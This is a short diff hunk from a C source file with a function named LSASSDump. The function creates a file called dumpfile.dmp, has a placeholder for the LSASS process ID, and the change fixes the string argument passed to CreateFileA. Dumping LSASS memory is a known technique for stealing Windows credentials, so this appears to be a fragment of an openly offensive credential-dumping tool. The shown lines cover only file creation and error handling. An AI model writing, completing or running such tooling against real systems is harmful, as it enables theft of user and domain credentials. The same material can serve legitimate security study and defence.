@@ -7,7 +7,7 @@ void LSASSDump()
 {
 	HANDLE lsassProcess;
 	int lsassPID = ; // Edit the LSASS PID here
-	HANDLE DumpFile = CreateFileA(L"dumpfile.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE DumpFile = CreateFileA("dumpfile.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (!DumpFile) {
 		printf("[!] Error creating dump file! %d\n", GetLastError());
 		exit(-1);
